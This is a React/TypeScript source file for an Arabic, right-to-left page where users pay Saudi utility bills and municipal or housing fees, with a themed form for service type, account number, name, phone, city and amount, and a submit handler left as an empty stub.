import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { MapPin, CreditCard, Building2, User, Phone, Hash, ArrowLeft } from "lucide-react";
import BrandedTopBar from "@/components/BrandedTopBar";
import CompanyHero from "@/components/CompanyHero";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";

const LocalPaymentPage = () => {
  const navigate = useNavigate();
  const { entity, identity } = useAutoApplyIdentity();
  
  const [customerName, setCustomerName] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [serviceType, setServiceType] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [amount, setAmount] = useState("");
  const [city, setCity] = useState("");

  const serviceKey = "local_payment";
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;

  const serviceTypes = [
    { id: "electricity", nameAr: "فاتورة الكهرباء", nameEn: "Electricity Bill" },
    { id: "water", nameAr: "فاتورة المياه", nameEn: "Water Bill" },
    { id: "gas", nameAr: "فاتورة الغاز", nameEn: "Gas Bill" },
    { id: "internet", nameAr: "فاتورة الإنترنت", nameEn: "Internet Bill" },
    { id: "phone", nameAr: "فاتورة الهاتف", nameEn: "Phone Bill" },
    { id: "municipality", nameAr: "رسوم البلدية", nameEn: "Municipality Fees" },
    { id: "housing", nameAr: "رسوم الإسكان", nameEn: "Housing Fees" },
  ];

  const cities = [
    "الرياض", "جدة", "مكة المكرمة", "المدينة المنورة", "الدمام", "الخبر", "تبوك", "أبها", "الطائف", "بريدة"
  ];

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Handle payment submission
  };

  return (
    <>
      <PaymentMetaTags
        serviceName="السداد المحلي"
        serviceKey={serviceKey}
        amount={amount ? `${amount} ريال` : ""}
        title="السداد المحلي - دفع الفواتير والخدمات"
        description="ادفع فواتير الخدمات المحلية بسهولة وأمان"
      />

      <BrandedTopBar 
        serviceKey={serviceKey}
        serviceName="السداد المحلي"
        showBackButton={true}
        showHero={false}
      />

      <CompanyHero serviceKey={serviceKey} className="mb-0" />

      <div 
        className="min-h-screen py-6 sm:py-8" 
        dir="rtl"
        style={{
          background: identity ? `linear-gradient(135deg, ${identity.colors.background}, ${identity.colors.secondary}15)` : `linear-gradient(135deg, #E6FFE6, #00C00015)`,
          fontFamily: identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
        }}
      >
        <div className="container mx-auto px-3 sm:px-4">
          <div className="max-w-2xl mx-auto">
            <Card 
              className="p-4 sm:p-8 shadow-2xl border-t-4 relative overflow-hidden" 
              style={{ 
                borderTopColor: identity?.colors.primary || '#008000',
                boxShadow: '0 20px 60px -15px rgba(0, 128, 0, 0.3)',
                borderRadius: '16px',
                background: '#FFFFFF'
              }}
            >
              <div 
                className="absolute top-0 left-0 right-0 h-1"
                style={{
                  background: `linear-gradient(90deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`
                }}
              />

              <form onSubmit={handleSubmit}>
                <div className="flex items-center justify-between mb-6 sm:mb-8">
                  <div>
                    <h1 
                      className="text-xl sm:text-3xl font-bold mb-1"
                      style={{ 
                        color: identity?.colors.primary || '#008000',
                        fontFamily: identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
                      }}
                    >
                      السداد المحلي
                    </h1>
                    <p className="text-sm text-muted-foreground">ادفع فواتير الخدمات بسهولة</p>
                  </div>

                  <div
                    className="w-14 h-14 sm:w-20 sm:h-20 rounded-full bg-white flex items-center justify-center shadow-lg overflow-hidden border-2"
                    style={{
                      borderColor: identity?.colors.primary || '#008000',
                    }}
                  >
                    {identity?.logo ? (
                      <img 
                        src={identity.logo} 
                        alt="السداد المحلي"
                        className="w-full h-full object-contain p-2"
                        onError={(e) => {
                          const parent = e.currentTarget.parentElement;
                          if (parent) {
                            parent.style.background = `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`;
                            parent.innerHTML = `<svg class="w-7 h-7 sm:w-10 sm:h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"></path></svg>`;
                          }
                        }}
                      />
                    ) : (
                      <Building2 className="w-7 h-7 sm:w-10 sm:h-10" style={{ color: identity?.colors.primary || '#008000' }} />
                    )}
                  </div>
                </div>

                <div className="space-y-4 mb-6">
                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <Building2 className="w-4 h-4" />
                      نوع الخدمة *
                    </Label>
                    <Select value={serviceType} onValueChange={setServiceType}>
                      <SelectTrigger className="h-12 border-2">
                        <SelectValue placeholder="اختر نوع الخدمة" />
                      </SelectTrigger>
                      <SelectContent>
                        {serviceTypes.map((service) => (
                          <SelectItem key={service.id} value={service.id}>
                            {service.nameAr}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <Hash className="w-4 h-4" />
                      رقم الحساب / المشترك *
                    </Label>
                    <Input
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                      placeholder="أدخل رقم الحساب"
                      className="h-12 border-2"
                      required
                    />
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <User className="w-4 h-4" />
                      الاسم الكامل *
                    </Label>
                    <Input
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      placeholder="أدخل اسمك الكامل"
                      className="h-12 border-2"
                      required
                    />
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <Phone className="w-4 h-4" />
                      رقم الجوال *
                    </Label>
                    <Input
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      placeholder="+966 5X XXX XXXX"
                      className="h-12 border-2"
                      required
                    />
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <MapPin className="w-4 h-4" />
                      المدينة *
                    </Label>
                    <Select value={city} onValueChange={setCity}>
                      <SelectTrigger className="h-12 border-2">
                        <SelectValue placeholder="اختر المدينة" />
                      </SelectTrigger>
                      <SelectContent>
                        {cities.map((cityName) => (
                          <SelectItem key={cityName} value={cityName}>
                            {cityName}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <CreditCard className="w-4 h-4" />
                      المبلغ المطلوب *
                    </Label>
                    <Input
                      type="number"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      placeholder="أدخل المبلغ"
                      className="h-12 border-2"
                      step="0.01"
                      min="0"
                      required
                    />
                  </div>
                </div>

                <div 
                  className="p-4 rounded-xl mb-6"
                  style={{
                    background: `${identity?.colors.primary || '#008000'}10`,
                    border: `1px solid ${identity?.colors.primary || '#008000'}30`
                  }}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-bold">المبلغ الإجمالي</span>
                    <span 
                      className="text-2xl font-bold"
                      style={{ color: identity?.colors.primary || '#008000' }}
                    >
                      {amount ? `${amount} ريال` : '---'}
                    </span>
                  </div>
                </div>

                <Button
                  type="submit"
                  size="lg"
                  className="w-full text-lg py-7 text-white font-bold shadow-2xl"
                  style={{
                    background: `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
                    fontFamily: identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
                  }}
                  disabled={!customerName || !customerPhone || !serviceType || !accountNumber || !amount || !city}
                >
                  <span className="ml-2">التالي - إتمام السداد</span>
                  <ArrowLeft className="w-5 h-5 mr-2" />
                </Button>

                <p className="text-xs text-center text-muted-foreground mt-4">
                  🔒 جميع المعاملات مشفرة وآمنة
                </p>
              </form>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default LocalPaymentPage;
